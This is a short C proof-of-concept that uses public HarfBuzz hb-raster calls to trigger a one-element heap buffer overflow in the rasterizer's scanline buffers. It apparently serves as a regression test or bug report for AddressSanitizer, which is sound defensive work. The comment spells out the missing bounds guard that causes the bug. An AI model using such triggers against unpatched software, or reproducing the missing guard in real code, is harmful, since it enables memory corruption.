/* AddressSanitizer proof-of-concept for a delocalized out-of-bounds write
 * in HarfBuzz's analytic rasterizer (hb-raster).
 *
 * Driven entirely through the public hb-raster API with in-contract input:
 *   - a fixed 8-pixel-wide surface (hb_raster_draw_set_extents), and
 *   - an outline whose edge extends far to the right of that surface,
 *     emitted through the public draw-funcs obtained from
 *     hb_raster_draw_get_funcs().
 *
 * On a correct tree the off-surface column walk in edge_sweep_row() is
 * clamped to the surface and the per-cell bounds guard in cell_add()
 * drops anything past it, so nothing is written out of bounds.  On the
 * vulnerable tree the left-to-right slow-path column clamp admits one
 * column past the surface (col == width) and cell_add() no longer guards
 * its right edge, so area[width]/cover[width] are written one element
 * past the scanline scratch buffers -> ASan heap-buffer-overflow.
 */

#include <hb.h>
#include <hb-raster.h>

int
main (void)
{
  hb_raster_draw_t *rdr = hb_raster_draw_create_or_fail ();
  if (!rdr)
    return 0;

  /* Fixed 8x8 surface at the origin.  Width 8 makes the scanline
   * scratch vector allocate exactly 8 elements, so a write to index 8
   * lands one element past the allocation. */
  hb_raster_extents_t ext;
  ext.x_origin = 0;
  ext.y_origin = 0;
  ext.width    = 8;
  ext.height   = 8;
  ext.stride   = 0;
  hb_raster_draw_set_extents (rdr, &ext);

  hb_draw_funcs_t *df = hb_raster_draw_get_funcs (rdr);
  hb_draw_state_t  st = HB_DRAW_STATE_DEFAULT;

  /* A thin triangle whose top edge runs left-to-right from inside the
   * surface (column 0) out to column 100, far past the right edge.
   * The edge crosses scanline row 4, where it is swept column by
   * column. */
  hb_draw_move_to   (df, rdr, &st,   0.0f, 4.0f);
  hb_draw_line_to   (df, rdr, &st, 100.0f, 4.5f);
  hb_draw_line_to   (df, rdr, &st,   0.0f, 5.0f);
  hb_draw_close_path (df, rdr, &st);

  hb_raster_image_t *img = hb_raster_draw_render (rdr);

  hb_raster_image_destroy (img);
  hb_raster_draw_destroy (rdr);
  return 0;
}
